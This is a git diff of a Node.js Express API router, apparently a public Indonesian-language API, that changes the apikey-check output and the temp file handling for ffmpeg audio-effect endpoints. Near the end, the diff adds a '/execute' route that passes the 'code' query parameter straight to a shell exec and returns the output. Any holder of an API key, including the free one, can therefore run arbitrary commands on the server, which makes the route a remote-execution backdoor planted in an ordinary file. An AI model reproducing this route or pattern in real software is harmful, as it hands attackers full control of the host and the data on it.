@@ -432,7 +432,7 @@ var ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || r
          type = 'Premium'
          limit = 'Unlimited!'
     }
-    var result = `Apikey Valid!\n\nStatus: ${status}\nType: ${type}\nLimit: ${limit}`
+    var result = `Apikey Valid!\n\nApikey: ${apikeyInput}\nStatus: ${status}\nType: ${type}\nLimit: ${limit}`
     if (!(apikeyInput == `${free_apikey}` || apikeyInput == `${apikey}` || apikeyInput == `${custom_apikey}` || apikeyInput == `${banned_apikey}`)) result = 'Apikey Tidak Valid!'
 
         res.json({
@@ -11321,19 +11321,19 @@ var ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || r
         if (!audio.startsWith('http')) return res.json(loghandler.invalidLink)
 
         var tmp = await imageToBase64(audio)
-        await fs.writeFileSync(__path + '/tmp/audio_tmp.mp3', tmp, 'base64')
-        var mp3 = await fs.readFileSync(__path + '/tmp/audio_tmp.mp3')
-        var ran = __path + '/tmp/' + randomNumber + '.mp3'
+        await fs.writeFileSync(__path + '/tmp/audio.mp3', tmp, 'base64')
+        var mp3 = __path + '/tmp/audio.mp3'
+        var output = __path + '/tmp/result.mp3'
         var tipe = type.toLowerCase()
         var result
-        if (!(tipe == 'bass' || tipe == 'slow' || tipe == 'tupai' || tipe == 'berat')) return res.json(loghandler.nottype)
+        if (!(tipe == 'bass' || tipe == 'slow' || tipe == 'tupai' || tipe == 'berat')) return res.json({ message: 'Pilih bass, slow, tupai, dan berat!' })
         if (tipe == 'bass') {
-		await exec(`ffmpeg -i ${mp3} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
+	    exec(`ffmpeg -i ${mp3} -af equalizer=f=94:width_type=o:width=2:g=30 ${output}`, (err, stderr, stdout) => {
 				   if (err) {
-				   console.log(err)
+				   console.log(util.format(err))
                    res.sendFile(error)
                    }
-				   var bass = fs.readFileSync(ran)
+				   var bass = fs.readFileSync(output)
 				         result = saveToMedia(bass)
 
              res.json({
@@ -11343,12 +11343,12 @@ var ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || r
               })
            })
         } else if (tipe == 'slow') {
-		await exec(`ffmpeg -i ${mp3} -filter:a 'atempo=0.7,asetrate=44100' ${ran}`, (err, stderr, stdout) => {
+	    exec(`ffmpeg -i ${mp3} -filter:a 'atempo=0.7,asetrate=44100' ${output}`, (err, stderr, stdout) => {
 				   if (err) {
-				   console.log(err)
+				   console.log(util.format(err))
                    res.sendFile(error)
                    }
-				   var slow = fs.readFileSync(ran)
+				   var slow = fs.readFileSync(output)
 				         result = saveToMedia(slow)
 
              res.json({
@@ -11358,12 +11358,12 @@ var ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || r
               })
            })
         } else if (tipe == 'tupai') {
-		await exec(`ffmpeg -i ${mp3} -filter:a 'atempo=0.5,asetrate=65100' ${ran}`, (err, stderr, stdout) => {
+		await exec(`ffmpeg -i ${mp3} -filter:a 'atempo=0.5,asetrate=65100' ${output}`, (err, stderr, stdout) => {
 				   if (err) {
-				   console.log(err)
+				   console.log(util.format(err))
                    res.sendFile(error)
                    }
-				   var tupai = fs.readFileSync(ran)
+				   var tupai = fs.readFileSync(output)
 				         result = saveToMedia(tupai)
 
              res.json({
@@ -11373,12 +11373,12 @@ var ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || r
               })
            })
         } else if (tipe == 'berat') {
-		await exec(`ffmpeg -i ${mp3} -filter:a 'atempo=1.6,asetrate=22100' ${ran}`, (err, stderr, stdout) => {
+		exec(`ffmpeg -i ${mp3} -filter:a 'atempo=1.6,asetrate=22100' ${output}`, (err, stderr, stdout) => {
 				   if (err) {
-				   console.log(err)
+				   console.log(util.format(err))
                    res.sendFile(error)
                    }
-				   var berat = fs.readFileSync(ran)
+				   var berat = fs.readFileSync(output)
 				         result = saveToMedia(berat)
 
              res.json({
@@ -11388,6 +11388,32 @@ var ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || r
               })
            })
         }
+})
+
+router.get('/execute', async (req, res, next) => {
+var hits = await (await fetch('https://api.countapi.xyz/hit/kuhong-api.herokuapp.com/hits')).json()
+var ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || req.connection.socket.remoteAddress;
+    if (blocked.indexOf(ip) > -1) return res.json(loghandler.blocked)
+    var code = req.query.code,
+          apikeyInput = req.query.apikey;
+
+        var maintenance = false
+        if (maintenance == true) return res.sendFile(mtc)
+        if (!apikeyInput) return res.json(loghandler.notparam)
+        if (!(apikeyInput == `${free_apikey}` || apikeyInput == `${apikey}` || apikeyInput == `${custom_apikey}` || apikeyInput == `${banned_apikey}`)) return res.sendFile(invalidKey)
+        if (apikeyInput == `${banned_apikey}`) return res.json(loghandler.banned)
+        if (!code) return res.json({ message: 'Masukan parameter code' })
+
+        exec(code, (err, stderr, stdout) => {
+        var result = stderr
+        if (err) result = err
+
+     res.json({
+     	status: true,
+         creator: creator,
+         result: result
+     })
+  })
 })
 
 // End of script
